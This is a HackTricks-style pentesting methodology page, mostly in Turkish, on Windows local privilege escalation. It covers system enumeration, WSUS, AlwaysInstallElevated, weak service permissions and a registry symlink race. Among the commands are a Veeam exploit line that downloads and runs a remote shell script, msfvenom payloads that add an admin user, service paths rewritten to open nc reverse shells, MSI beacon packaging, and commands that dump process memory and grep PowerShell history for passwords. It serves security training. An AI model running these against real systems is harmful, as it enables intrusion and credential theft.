# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **En iyi araç Windows local privilege escalation vektörlerini aramak için:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows - Temel Teori

### Access Tokens

**Windows Access Tokens'ın ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okuyun:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs hakkında daha fazla bilgi için aşağıdaki sayfayı kontrol edin:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Bütünlük Seviyeleri

**Windows'taki bütünlük seviyelerinin ne olduğunu bilmiyorsanız, devam etmeden önce aşağıdaki sayfayı okumalısınız:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Güvenlik Kontrolleri

Windows'ta sistemin keşfedilmesini, yürütülebilir dosya çalıştırmanızı veya aktivitelerinizin tespit edilmesini önleyebilecek farklı şeyler vardır. privilege escalation enumeration'a başlamadan önce bu savunma mekanizmalarını açıklayan aşağıdaki sayfayı okumalı ve hepsini keşfetmelisiniz:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess süreçleri `RAiLaunchAdminProcess` aracılığıyla başlatıldığında, AppInfo secure-path kontrolleri atlatıldığında prompt olmadan High IL'ye ulaşmak için kötüye kullanılabilir. Bu konuyla ilgili özel UIAccess/Admin Protection bypass akışını burada inceleyin:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Sistem Bilgileri

### Sürüm bilgisi keşfi

Windows sürümünün bilinen bir güvenlik açığı olup olmadığını kontrol edin (uygulanan yamaları da kontrol edin).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Sürüm Exploits

This [site](https://msrc.microsoft.com/update-guide/vulnerability) is handy for searching out detailed information about Microsoft security vulnerabilities. This database has more than 4,700 security vulnerabilities, showing the **massive attack surface** that a Windows environment presents.

**Sistemde**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas içinde watson gömülü)_

**Yerelde (sistem bilgisi ile)**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Ortam

Any credential/Juicy info saved in the env variables?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Geçmişi
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript dosyaları

Bunu nasıl etkinleştireceğinizi şu adreste öğrenebilirsiniz: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline yürütmelerinin ayrıntıları kaydedilir; yürütülen komutlar, komut çağrıları ve betiklerin parçaları dahil. Ancak tam yürütme ayrıntıları ve çıktı sonuçları yakalanmayabilir.

Bunu etkinleştirmek için belgelendirmedeki "Transcript files" bölümündeki talimatları izleyin, **"Module Logging"**'i **"Powershell Transcription"** yerine tercih edin.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell günlüklerinden son 15 olayı görüntülemek için şu komutu çalıştırabilirsiniz:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Betik yürütmesinin eksiksiz bir etkinlik ve tam içerik kaydı tutulur; böylece her kod bloğunun çalışırken belgelendiği garanti edilir. Bu süreç, her bir etkinliğin kapsamlı bir denetim izi korur; forensics ve zararlı davranışların analizinde değerlidir. Yürütme sırasında tüm etkinlikleri belgeleyerek süreç hakkında ayrıntılı bilgiler sağlanır.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block için günlük olayları Windows Olay Görüntüleyicisinde şu yolda bulunur: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Son 20 olayı görüntülemek için şunu kullanabilirsiniz:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### İnternet Ayarları
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Sürücüler
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Güncellemeler http**S** yerine http üzerinden talep ediliyorsa sistemi ele geçirebilirsiniz.

İlk olarak ağın non-SSL WSUS update kullanıp kullanmadığını cmd'de aşağıdakini çalıştırarak kontrol edin:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Veya PowerShell'te aşağıdaki:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Eğer aşağıdakilerden biri gibi bir yanıt alırsanız:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> Eğer yerel kullanıcı proxy'mizi değiştirme yetkimiz varsa ve Windows Updates Internet Explorer’ın ayarlarında yapılandırılmış proxy’yi kullanıyorsa, bu durumda kendi trafiğimizi yakalamak ve hedef sistemimizde yükseltilmiş bir kullanıcı olarak kod çalıştırmak için yerel olarak [PyWSUS](https://github.com/GoSecure/pywsus) çalıştırma yetkimiz olur.
>
> Ayrıca, WSUS servisi mevcut kullanıcının ayarlarını kullandığı için onun sertifika deposunu da kullanacaktır. WSUS hostname’i için kendinden imzalı bir sertifika üretir ve bu sertifikayı mevcut kullanıcının sertifika deposuna eklerseniz, hem HTTP hem de HTTPS WSUS trafiğini yakalayabileceksiniz. WSUS, sertifika üzerinde trust-on-first-use tipi bir doğrulamayı uygulamak için HSTS-benzeri bir mekanizma kullanmaz. Sunulan sertifika kullanıcı tarafından güvenilen ve doğru hostname'e sahipse, servis tarafından kabul edilecektir.

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Many enterprise agents expose a localhost IPC surface and a privileged update channel. If enrollment can be coerced to an attacker server and the updater trusts a rogue root CA or weak signer checks, a local user can deliver a malicious MSI that the SYSTEM service installs. See a generalized technique (based on the Netskope stAgentSvc chain – CVE-2025-0309) here:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` exposes a localhost service on **TCP/9401** that processes attacker-controlled messages, allowing arbitrary commands as **NT AUTHORITY\SYSTEM**.

- **Recon**: dinleyiciyi ve sürümü doğrulayın, örn., `netstat -ano | findstr 9401` ve `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: gerekli Veeam DLL'leri ile birlikte bir PoC (ör. `VeeamHax.exe`) aynı dizine yerleştirin, sonra yerel soket üzerinden SYSTEM payload'unu tetikleyin:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Servis komutu SYSTEM hesabı olarak çalıştırılır.

## KrbRelayUp

Windows **domain** ortamlarında belirli koşullar altında bir **local privilege escalation** zafiyeti bulunmaktadır. Bu koşullar; **LDAP signing is not enforced,** kullanıcıların **Resource-Based Constrained Delegation (RBCD)** yapılandırmasını ayarlayabilme haklarına sahip olmaları ve kullanıcıların etki alanı içinde bilgisayar oluşturabilme yeteneğini içermektedir. Bu **requirements**'ın **default settings** ile karşılandığını belirtmek önemlidir.

Find the **exploit in** [https://github.com/Dec0ne/KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp)

Saldırının akışı hakkında daha fazla bilgi için bkz: [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** bu 2 kayıt **enabled** (değer **0x1**) ise, herhangi bir ayrıcalığa sahip kullanıcılar `*.msi` dosyalarını NT AUTHORITY\\**SYSTEM** olarak **install** (çalıştırabilir).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Eğer bir meterpreter oturumunuz varsa bu tekniği **`exploit/windows/local/always_install_elevated`** modülünü kullanarak otomatikleştirebilirsiniz

### PowerUP

Geçerli dizin içinde ayrıcalıkları yükseltmek için bir Windows MSI ikili dosyası oluşturmak için power-up'taki `Write-UserAddMSI` komutunu kullanın. Bu script, kullanıcı/grup eklemesi için istemde bulunan önceden derlenmiş bir MSI yükleyici yazar (bu nedenle GIU erişimi gerekecektir):
```
Write-UserAddMSI
```
Ayrıcalıkları yükseltmek için oluşturulan ikiliyi çalıştırın.

### MSI Wrapper

Bu öğreticiyi okuyarak MSI wrapper oluşturmayı öğrenin. Sadece komut satırlarını çalıştırmak istiyorsanız bir "**.bat**" dosyasını sarabilirsiniz.


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Cobalt Strike** veya **Metasploit** kullanarak `C:\privesc\beacon.exe` yolunda yeni bir **Windows EXE TCP payload** oluşturun.
- **Visual Studio**'yu açın, **Create a new project**'i seçin ve arama kutusuna "installer" yazın. **Setup Wizard** projesini seçin ve **Next**'e tıklayın.
- Projeye bir ad verin, örneğin **AlwaysPrivesc**, konum olarak **`C:\privesc`** kullanın, **place solution and project in the same directory**'i seçin ve **Create**'e tıklayın.
- 4 adımdan 3. adıma (include edilecek dosyaları seçin) ulaşana kadar **Next**'e tıklamaya devam edin. **Add**'e tıklayın ve az önce oluşturduğunuz Beacon payload'u seçin. Ardından **Finish**'e tıklayın.
- **Solution Explorer**'da **AlwaysPrivesc** projesini seçin ve **Properties** içinde **TargetPlatform**'ı **x86**'dan **x64**'e değiştirin.
- Yüklenecek uygulamayı daha meşru gösterebilecek **Author** ve **Manufacturer** gibi değiştirilebilecek başka özellikler vardır.
- Projeye sağ tıklayın ve **View > Custom Actions**'ı seçin.
- **Install**'e sağ tıklayın ve **Add Custom Action**'ı seçin.
- **Application Folder**'a çift tıklayın, **beacon.exe** dosyanızı seçin ve **OK**'e tıklayın. Bu, installer çalıştırılır çalıştırılmaz beacon payload'unun yürütülmesini sağlar.
- **Custom Action Properties** altında **Run64Bit**'i **True** olarak değiştirin.
- Son olarak, projeyi **build** edin.
- Eğer `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` uyarısı görünürse, platformu x64 olarak ayarladığınızdan emin olun.

### MSI Installation

Kötü amaçlı `.msi` dosyasının arka planda yüklemesini gerçekleştirmek için:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Bu zafiyeti istismar etmek için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Tespit Sistemleri

### Denetim Ayarları

Bu ayarlar neyin **kaydedildiğini** belirler, bu yüzden dikkat etmelisiniz
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — günlüklerin nereye gönderildiğini bilmek ilginçtir.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS**, yerel Administrator parolalarının yönetimi için tasarlanmıştır; etki alanına katılmış bilgisayarlarda her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmesini** sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilmiş kullanıcılar tarafından erişilebilir; yetkilendirildiklerinde yerel Administrator parolalarını görüntüleyebilirler.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS içinde saklanır** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Koruması

**Windows 8.1**'den başlayarak, Microsoft, Local Security Authority (LSA) için güvenilmeyen süreçlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla gelişmiş bir koruma getirdi ve böylece sistemi daha da güvenli hale getirdi.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10'da tanıtıldı. Amacı, cihazda depolanan kimlik bilgilerini pass-the-hash gibi tehditlere karşı korumaktır.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** işletim sistemi bileşenleri tarafından kullanılır ve **Local Security Authority** (LSA) tarafından doğrulanır. Bir kullanıcının oturum açma verileri kayıtlı bir security package tarafından doğrulandığında, kullanıcı için genellikle domain credentials oluşturulur.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Kullanıcılar & Gruplar

### Kullanıcıları ve Grupları Listeleme

Ait olduğunuz grupların herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ayrıcalıklı gruplar

Eğer bir **ayrıcalıklı grubun üyesiyseniz ayrıcalıkları yükseltebilirsiniz**. Ayrıcalıklı gruplar ve bunları ayrıcalık yükseltmek için nasıl suistimal edebileceğiniz hakkında bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipülasyonu

**Daha fazla bilgi** edinmek için bu sayfaya bakın: bir **token**'ın ne olduğunu: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Aşağıdaki sayfayı inceleyin; ilginç **token**'lar hakkında bilgi edinin ve bunları nasıl suistimal edeceğinizi öğrenin:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Giriş yapmış kullanıcılar / Oturumlar
```bash
qwinsta
klist sessions
```
### Ev klasörleri
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Parola Politikası
```bash
net accounts
```
### Panodaki içeriği al
```bash
powershell -command "Get-Clipboard"
```
## Çalışan İşlemler

### Dosya ve Klasör İzinleri

Her şeyden önce, süreçleri listelerken **işlem komut satırında şifre olup olmadığını kontrol edin**.\
Çalışan bazı binary'leri **overwrite** edip edemeyeceğinizi veya binary klasörüne yazma izninizin olup olmadığını kontrol edin; böylece olası [**DLL Hijacking attacks**](dll-hijacking/index.html) exploit edebilirsiniz:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Her zaman [**electron/cef/chromium debuggers** çalışıyor olabilir; ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin.

**İşlemlerin ikili dosyalarının izinlerini kontrol etme**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**İşlemlerin binaries klasörlerinin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Bellek Parola Madenciliği

Çalışan bir sürecin bellek dökümünü sysinternals'tan **procdump** ile oluşturabilirsiniz. FTP gibi servislerde **credentials in clear text in memory** bulunur; belleği döküp bu credentials'ı okuyun.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Güvenli Olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar bir kullanıcının CMD başlatmasına veya dizinleri gezmesine izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" öğesine tıklayın

## Servisler

Service Triggers, belirli koşullar oluştuğunda (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh vb.) Windows'un bir servisi başlatmasını sağlar. SERVICE_START haklarına sahip olmasanız bile, tetikleyicilerini çalıştırarak ayrıcalıklı servisleri sıklıkla başlatabilirsiniz. Burada enumeration and activation techniques'ı inceleyin:

-
{{#ref}}
service-triggers.md
{{#endref}}

Servislerin listesini alın:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### İzinler

Bir hizmet hakkında bilgi almak için **sc**'yi kullanabilirsiniz
```bash
sc qc <service_name>
```
Her hizmet için gerekli ayrıcalık düzeyini kontrol etmek amacıyla _Sysinternals_'ten temin edilen **accesschk** binary'sine sahip olmak önerilir.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
"Authenticated Users" grubunun herhangi bir hizmeti değiştirebiliyor mu diye kontrol edilmesi önerilir:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştir

Bu hatayı alıyorsanız (örneğin SSDPSRV ile):

_System error 1058 has occurred._\
_Hizmet başlatılamıyor; ya devre dışı bırakılmış ya da ilişkilendirilmiş etkin bir aygıtı yok._

Etkinleştirmek için şunu kullanabilirsiniz
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**upnphost servisinin çalışması için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Başka bir çözüm** bu sorunda şu komutu çalıştırmaktır:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Bir serviste "Authenticated users" grubunun **SERVICE_ALL_ACCESS** iznine sahip olması durumunda, servisin yürütülebilir dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Servisi yeniden başlat
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
İmtiyazlar çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis ikili dosyasının yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar, bu da servis yapılandırmalarını değiştirme yeteneğine yol açar.
- **WRITE_OWNER**: Sahiplik edinme ve izinlerin yeniden yapılandırılmasına izin verir.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Ayrıca servis yapılandırmalarını değiştirme yeteneğini devralır.

Bu zafiyetin tespiti ve istismarı için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis ikili dosyalarının zayıf izinleri

**Bir servis tarafından çalıştırılan ikili dosyayı değiştirebilip değiştiremeyeceğinizi kontrol edin** veya ikili dosyanın bulunduğu klasörde **yazma izinlerine** sahip olup olmadığınızı kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servisin çalıştırdığı tüm ikili dosyaları **wmic** ile (system32'de olmayanları) alabilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Ayrıca **sc** ve **icacls** kullanabilirsiniz:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Servis kayıt defteri değiştirme izinleri

Herhangi bir servis kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir servis **kayıt defteri** üzerindeki **izinlerinizi** **kontrol** etmek için şunu yapabilirsiniz:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE**'in `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Eğer öyleyse, servis tarafından çalıştırılan binary değiştirilebilir.

Çalıştırılan binary'nin Path'ini değiştirmek için:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** süreci tarafından bir HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race** bu ayrıcalıklı yazmayı **any HKLM path**'e yönlendirebilir ve rastgele bir HKLM **value write** ilki sağlar.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` yüklenen erişilebilirlik özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` kullanıcı tarafından kontrol edilen yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` oturum açma/secure-desktop geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Abuse flow (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini doldurun.
2. secure-desktop kopyasını tetikleyin (ör. **LockWorkstation**), bu AT broker akışını başlatır.
3. **Yarışı kazanın** bir **oplock** yerleştirerek `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını korumalı bir HKLM hedefe işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilen HKLM yoluna yazar.

Bir kez rastgele HKLM value write elde ettiğinizde, servis yapılandırma değerlerini ezerek LPE'ye pivot yapın:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabileceği bir servis seçin (ör. **`msiserver`**) ve yazma işleminden sonra tetikleyin. **Not:** public exploit implementation yarışın bir parçası olarak iş istasyonunu kilitler.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Servis kayıt defteri AppendData/AddSubdirectory izinleri

Eğer bir registry üzerinde bu izne sahipseniz, bu, **o kayıttan alt kayıtlar oluşturabileceğinizi** gösterir. Windows servisleri durumunda bu, **arbitrary code** çalıştırmak için yeterlidir:

{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

